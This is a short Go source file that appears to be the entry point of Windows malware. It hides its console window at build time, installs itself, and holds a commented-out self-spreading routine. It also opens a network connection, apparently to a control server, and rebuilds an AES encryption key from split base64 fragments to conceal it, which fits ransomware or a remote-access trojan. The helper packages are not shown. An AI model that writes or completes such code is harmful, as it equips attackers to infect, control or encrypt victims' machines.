//go:generate goversioninfo -icon=icon.ico
//Compile: go build -ldflags "-s -w -H=windowsgui"

package main

import (
    "./aes"
    "./base64"
    "./install"
    "./instances"
    "./network"
)

func main() {
    //Check if already running
    instances.CheckMultiInstances()
    install.Install()

    //go Spread()
    go network.EstablishConnection()

    //Deofuscate key
    // TODO add RSA key methods
    b64_1 := "fSss" + "L1IkKy"
    b64_2 := "p3ZU4zR" + "3g5e"
    b64_3 := "ipMZy5" + "VYm13O"
    b64_4 := "Xg+WF" + "9jKnE="
    final := b64_1 + b64_2 + b64_3 + b64_4
    key_text = []byte(base64.Decode(final))
    aes.InitializeBlock(key_text)
    for {
    }
}
